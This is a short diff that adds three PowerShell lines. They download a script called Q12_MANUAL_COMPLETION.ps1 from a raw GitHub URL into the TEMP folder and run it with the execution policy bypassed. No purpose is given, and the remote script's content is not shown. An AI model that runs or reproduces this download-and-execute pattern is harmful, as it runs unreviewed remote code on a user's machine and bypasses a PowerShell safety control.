@@ -1,0 +1,3 @@
+$p="$env:TEMP\Q12_MANUAL_COMPLETION.ps1"
+Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/Yaserbayad/chatgpt-master-plan-relay-v7/main/qualification/Q12_MANUAL_COMPLETION.ps1" -OutFile $p
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File $p
